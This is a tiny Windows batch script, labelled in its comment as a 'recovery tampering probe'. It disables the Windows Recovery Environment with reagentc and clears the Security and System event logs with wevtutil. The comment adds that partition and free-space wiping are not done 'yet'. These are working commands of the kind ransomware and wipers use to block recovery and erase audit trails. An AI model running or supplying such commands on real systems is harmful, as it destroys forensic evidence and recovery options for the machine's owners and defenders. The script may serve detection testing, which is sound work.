@echo off
rem Recovery tampering probe: disables the Windows Recovery Environment and
rem clears core event logs. No partition or free-space wiping yet.
reagentc /disable
wevtutil cl Security
wevtutil cl System
